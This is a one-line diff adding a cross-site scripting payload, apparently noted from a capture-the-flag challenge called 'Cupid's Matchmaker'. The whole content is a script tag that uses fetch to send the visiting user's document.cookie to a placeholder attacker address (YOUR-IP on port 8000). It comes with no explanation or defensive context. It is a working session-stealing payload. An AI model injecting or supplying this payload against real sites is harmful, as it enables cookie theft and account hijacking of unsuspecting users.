@@ -1,0 +1,1 @@
+<script>fetch(‘http://YOUR-IP:8000/?c='+document.cookie)</script> - from Cupid's Matchmaker
